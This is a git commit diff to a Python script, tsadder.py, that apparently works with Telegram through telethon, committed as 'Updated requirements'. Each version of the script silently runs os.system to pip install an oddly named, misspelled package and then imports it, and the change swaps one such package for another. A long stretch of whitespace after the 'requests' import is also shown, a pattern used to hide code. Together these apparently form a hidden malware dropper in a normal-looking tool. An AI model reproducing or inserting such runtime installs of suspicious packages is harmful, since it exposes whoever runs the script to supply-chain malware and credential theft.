0233e18c9154945f7e3213204dde1bef1c225806
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-18 21:24:36 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitetoolkitV1")
-import pythonsqlitetoolkitV1
+os.system("pip install pythoncolouringsliberyV1")
+import pythoncolouringsliberyV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
